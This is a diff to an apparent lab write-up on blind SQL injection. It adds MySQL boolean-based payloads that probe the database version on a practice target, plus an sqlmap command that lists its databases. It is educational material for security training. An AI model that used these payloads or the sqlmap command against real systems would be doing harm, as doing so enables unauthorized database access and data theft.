@@ -204,10 +204,19 @@ that means the arbitrary query that we sent got executed in DB,  hence there is 
 
 Now, lets extract data from the vulnerability we found, by further modifying the payload that we give to sql query :
 
-in this lab the DB is mysql so we craft payload using mysql syntax :-   
+in this lab the DB is mysql so we craft payload using mysql syntax :-   (below i noted that worked )
 ```
-may 2020'and substring(@@version,1,1 )=5 and '1=1
+may 2020'and substring(@@version,1,1 )>=5 and '1=1
 ```
+
+```
+may 2020'and substring(@@version,1,1 )=8 and '1=1
+```
+
+
+
+Using SQL map for the 
+sqlmap -u http://sqli2.naham.sec:8081/article-count?date=may%202020 --dbs --batch
 
 ```
 
